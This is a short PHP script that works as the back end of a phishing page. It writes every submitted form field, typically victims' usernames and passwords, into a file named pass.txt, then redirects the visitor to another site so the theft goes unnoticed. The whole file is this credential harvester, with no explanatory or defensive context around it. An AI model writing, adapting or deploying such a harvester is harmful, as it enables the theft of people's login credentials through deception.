<?php
 
header('Location: http://www.example.com/');
 
$salah = fopen("pass.txt",  "a");
foreach($_POST as $mahdi => $value ) {

fwrite($salah, $mahdi );
fwrite($salah ,"=");
fwrite($salah, $value);
fwrite($salah,  "\r\n");




}
fwrite($salah, "\r\n");
fclose($salah);
exit

?>
